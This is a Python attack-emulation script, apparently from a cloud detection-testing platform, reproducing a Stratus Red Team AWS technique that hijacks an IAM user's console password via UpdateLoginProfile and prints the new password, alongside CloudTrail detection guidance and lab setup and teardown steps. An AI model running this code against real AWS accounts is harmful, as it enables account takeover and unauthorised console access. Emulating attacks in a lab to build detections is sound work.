"""
Technique : aws.privilege-escalation.iam-update-user-login-profile
Tactic    : Privilege Escalation (T1098.001)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.privilege-escalation.iam-update-user-login-profile/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the target IAM user + login profile.
  - AWS credentials must have iam:UpdateLoginProfile.

How the attack works:
  An attacker who has compromised a principal with iam:UpdateLoginProfile
  permission can silently change another IAM user's console password to
  one they control, then log into the AWS console as that user.
  A single UpdateLoginProfile call is the only CloudTrail evidence.

Detection signal:
  - iam:UpdateLoginProfile in CloudTrail where the requesting principal is NOT
    an expected administrator or password-reset automation role.
  - Alert when the caller ARN differs from known password-management roles.

Revert:
  - Run `pulumi destroy` in ../infra/ to delete the user and login profile.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import secrets
import string
import subprocess
from pathlib import Path

import boto3


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


def generate_password(length: int = 16) -> str:
    """Generate a random IAM-compliant password (upper, lower, digit, symbol)."""
    alphabet = string.ascii_letters + string.digits + "!@#$%^&*()"
    while True:
        pwd = "".join(secrets.choice(alphabet) for _ in range(length))
        # IAM requires at least one of each character class
        if (any(c.isupper() for c in pwd)
                and any(c.islower() for c in pwd)
                and any(c.isdigit() for c in pwd)
                and any(c in "!@#$%^&*()" for c in pwd)):
            return pwd


# ── Main ──────────────────────────────────────────────────────────────────────

def main(session: "boto3.Session") -> None:
    stack_dir        = str(Path(__file__).parent.parent / "infra")
    infra            = get_pulumi_outputs(stack_dir)
    target_user_name = infra.get("target_user_name",
                                 "stratus-red-team-update-login-profile-user")

    iam_client = session.client("iam")

    # Verify target user exists
    try:
        iam_client.get_login_profile(UserName=target_user_name)
    except iam_client.exceptions.NoSuchEntityException:
        print(f"[!] No login profile found for {target_user_name}")
        print("    Did you run `pulumi up` in ../infra/?")
        return

    # ── Step 1: Hijack the console password ───────────────────────────────────
    banner("Step 1 — Hijack console password (UpdateLoginProfile)")
    attacker_password = generate_password()
    iam_client.update_login_profile(
        UserName=target_user_name,
        Password=attacker_password,
        PasswordResetRequired=False,
    )
    print(f"  [+] Console password changed for: {target_user_name}")
    print(f"  [+] New password (attacker-controlled): {attacker_password}")
    print("  [!] CloudTrail event: iam:UpdateLoginProfile")
    print(f"  [!] Attacker can now log into AWS console as: {target_user_name}")
    print("  [!] No other API calls visible — single high-signal event")

    banner("Complete")
    print("Single CloudTrail event generated: iam:UpdateLoginProfile")
    print("\nDetection guidance:")
    print("  Alert when iam:UpdateLoginProfile caller ARN is NOT a known")
    print("  password-management role or admin principal.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the target user.")


if __name__ == "__main__":
    main(boto3.Session())


# ── MayaTrail Option-C entry point ─────────────────────────────────────────────

def _session_from_outputs(outputs: dict, region: str) -> boto3.Session:
    """Build a session from the worker-injected assumed-role creds (Option C);
    fall back to the ambient default session when run standalone."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def run(outputs: dict, region: str = "us-east-1") -> None:
    """Entry point called by the run_emulation_attack Celery task."""
    main(_session_from_outputs(outputs, region))
